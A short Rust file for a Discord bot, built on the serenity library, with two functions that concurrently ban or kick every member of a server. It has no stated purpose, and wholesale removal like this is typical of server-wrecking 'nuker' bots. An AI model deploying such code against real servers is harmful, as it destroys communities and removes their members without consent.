use serenity::model::prelude::*;
use serenity::prelude::*;
use tokio::task;

pub async fn ban_all(ctx: &Context, guild_id: GuildId) {
    let guild = guild_id.to_partial_guild(&ctx.http).await.unwrap();

    let members = guild.members(&ctx.http, None, None).await.unwrap().to_vec();
    let futures: Vec<_> = members
        .iter()
        .cloned()
        .map(|member| {
            let http = ctx.http.clone();
            task::spawn(async move {
                if let Err(err) = member.ban(&http, 0).await {
                    eprintln!("Error banning member {}: {:?}", member.user.id, err);
                }
            })
        })
        .collect();

    for future in futures {
        let _ = future.await;
    }
}

pub async fn kick_all(ctx: &Context, guild_id: GuildId) {
    let guild = guild_id.to_partial_guild(&ctx.http).await.unwrap();

    let members = guild.members(&ctx.http, None, None).await.unwrap().to_vec();
    let futures: Vec<_> = members
        .iter()
        .cloned()
        .map(|member| {
            let http = ctx.http.clone();
            task::spawn(async move {
                if let Err(err) = member.kick(&http).await {
                    eprintln!("Error kicking member {}: {:?}", member.user.id, err);
                }
            })
        })
        .collect();

    for future in futures {
        let _ = future.await;
    }
}